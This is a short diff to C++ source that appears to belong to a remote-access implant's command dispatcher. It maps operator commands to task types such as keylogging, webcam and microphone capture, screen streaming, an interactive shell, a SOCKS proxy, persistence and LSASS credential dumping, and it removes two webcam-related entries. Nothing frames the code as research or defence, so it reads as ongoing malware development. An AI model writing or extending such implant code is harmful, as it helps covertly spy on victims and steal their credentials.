@@ -30,7 +30,6 @@ namespace {
         if (str == "keylog") return beacon::TaskType::KEYLOG;
         if (str == "webcam") return beacon::TaskType::WEBCAM;
         if (str == "mic") return beacon::TaskType::MIC;
-        if (str == "webcam_stream") return beacon::TaskType::WEBCAM_STREAM;
         if (str == "screen_stream") return beacon::TaskType::SCREEN_STREAM;
         if (str == "ishell" || str == "shell") return beacon::TaskType::ISHELL;
         if (str == "deep_recon") return beacon::TaskType::DEEP_RECON;
@@ -41,7 +40,6 @@ namespace {
         if (str == "socks_proxy") return beacon::TaskType::SOCKS_PROXY;
         if (str == "adv_persistence") return beacon::TaskType::ADV_PERSISTENCE;
         if (str == "dump_lsass") return beacon::TaskType::DUMP_LSASS;
-        if (str == "list_webcams") return beacon::TaskType::LIST_WEBCAMS;
         if (str == "get_logs") return beacon::TaskType::GET_LOGS;
         // Add other mappings here
         return beacon::TaskType::UNKNOWN;
